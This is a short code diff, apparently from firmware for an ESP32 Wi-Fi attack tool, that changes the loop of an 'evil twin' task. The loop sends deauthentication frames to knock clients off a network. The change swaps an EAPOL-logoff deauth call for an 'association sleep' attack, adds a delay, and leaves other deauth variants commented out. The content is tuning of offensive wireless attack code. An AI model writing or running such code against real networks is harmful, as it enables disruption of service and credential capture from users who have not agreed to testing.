@@ -62,8 +62,10 @@ static void evil_twin_task(void *pvParameters)
 
         /* Send deauth to clients */
         wifi_attack_deauth_basic();
-        wifi_attack_deauth_ap_eapol_logoff();
+        vTaskDelay(pdMS_TO_TICKS(20));
+        //wifi_attack_deauth_client_bad_msg1();
         //wifi_attack_deauth_client_negative_tx_power();
+        wifi_attack_association_sleep();
 
         vTaskDelay(pdMS_TO_TICKS(200));
     }
